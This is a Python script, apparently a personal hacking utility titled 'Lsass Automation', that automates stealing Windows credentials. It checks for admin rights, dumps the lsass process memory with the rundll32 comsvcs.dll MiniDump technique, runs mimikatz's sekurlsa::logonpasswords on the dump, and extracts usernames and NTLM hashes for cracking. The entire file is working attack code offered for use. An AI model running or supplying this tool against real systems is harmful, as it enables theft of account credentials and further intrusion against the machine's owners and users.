import os
import subprocess
import sys
import wexpect
import time

def logBanner():
    banner =r"""
$$$$$$$$\                      $$\     $$\           
$$  _____|                     $$ |    \__|          
$$ |      $$\   $$\  $$$$$$\ $$$$$$\   $$\  $$$$$$$\ 
$$$$$\    \$$\ $$  |$$  __$$\\_$$  _|  $$ |$$  _____|
$$  __|    \$$$$  / $$ /  $$ | $$ |    $$ |$$ /      
$$ |       $$  $$<  $$ |  $$ | $$ |$$\ $$ |$$ |      
$$$$$$$$\ $$  /\$$\ \$$$$$$  | \$$$$  |$$ |\$$$$$$$\ 
\________|\__/  \__| \______/   \____/ \__| \_______|
                                                     
Lsass Automation! Made by Exotic!! v1.0                                                     
                                                     
"""
    return banner

def is_admin():
    check_admin = subprocess.run('net session' ,shell = True, text = True, capture_output = True)
    if 'Access is denied' in check_admin.stderr:
        return False
    else:
        return True


def lsass_extract(current_dir):
    print("[+] Starting Dumping lsass process")
    print("[*] Looking for the lsass Process")
    os.system("powershell.exe Get-Process lsass")
    lsass_pid = int(input("\n[?] What is the lsass PID? "))
    print("[*] Executing Dumping for the lsass Process to current directory")
    try:
        os.chdir('c:\\windows\\system32')
        subprocess.run(f'.\\rundll32.exe comsvcs.dll, MiniDump {lsass_pid} {current_dir}\\lsass.dmp full' ,shell = True)
    except Exception as e:
        print("[-] Something went wrong.. ",e)
        exit(0)

    os.chdir(current_dir)
    if 'lsass.dmp' in os.listdir():
        print("[+] Lsass was successfuly dumped!")
    else:
        print("[-] Something went wrong... try running as Administrator again")
        exit(0)

def mimikatz_dumping(lsass_path, current_dir):
    try:
        print("[*] Starting Mimikatz BE PATIENT!")
        child = wexpect.spawn('mimikatz.exe')
        child.expect('#')
        child.sendline('log MimiDump.txt')
        child.expect('#')
        child.sendline('privilege::debug')
        child.expect('#')
        child.sendline('token::elevate')
        child.expect('#')
        child.sendline(f'sekurlsa::minidump {lsass_path}')
        child.expect("#")
        child.sendline('sekurlsa::logonpasswords')
        child.expect("#")
        child.sendline("exit")
        time.sleep(1.5)
        os.system(f'powershell mv MimiDump.txt {current_dir}')
        print('[+] MimiDump.txt file was created successfuly to crack the NTLM Hash!')
    except Exception as e:
        print('[-] Something went Wrong: ',e)

def mimi_examine():
    try:
        with open('MimiDump.txt', 'r') as mimi_dump:
            mimi_file = [line.strip('\r').strip('\n').replace(' ', '').replace('\t', '') for line in mimi_dump.readlines()]
        cred_list = list()
        for i in range(len(mimi_file)):
            if mimi_file[i].startswith('*Username:'):
                if mimi_file[i + 2].startswith('*NTLM:'):
                    if not (mimi_file[i].strip("*") in cred_list):
                        cred_list.append(mimi_file[i].lstrip('*'))
                        cred_list.append(mimi_file[i + 2].lstrip('*'))
        print("[+] Found Credential!\n")
        return cred_list
    except Exception as e:
        print("[-] Something went wrong.. ",e)
        exit(0)

def main():
    os.system('cls')
    print(logBanner())
    current_dir = os.getcwd()
    if not is_admin():
        print("[-] You need to run the script as Administrator")
        print("[-] Exiting...")
        exit(0)
    user_input = input('[?] Do you have lsass.dmp (Y/N)? ')
    if user_input.lower() == 'n':
        lsass_extract(current_dir)
        lsass_path = os.getcwd() + '\lsass.dmp'
    
    elif user_input.lower() == 'y':
            lsass_path = input('Enter the full lsass.dmp path: ')
        
    else:
        print('[-] You have to enter Y/N ONLY!')
        exit(0)
    
    mimi_path = input("Enter the mimikatz path: ")
    os.chdir(mimi_path)
    mimikatz_dumping(lsass_path, current_dir)
    os.chdir(current_dir)
    cred_file = mimi_examine()
    for cred in cred_file:
        if cred.startswith('Username:'):
            print('\n')
        print(cred)
    print('\n')

if __name__ == "__main__":
    main()
